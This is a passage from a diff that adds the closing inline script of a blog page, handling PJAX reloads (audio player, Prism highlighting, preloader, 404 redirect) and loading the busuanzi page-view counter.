+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
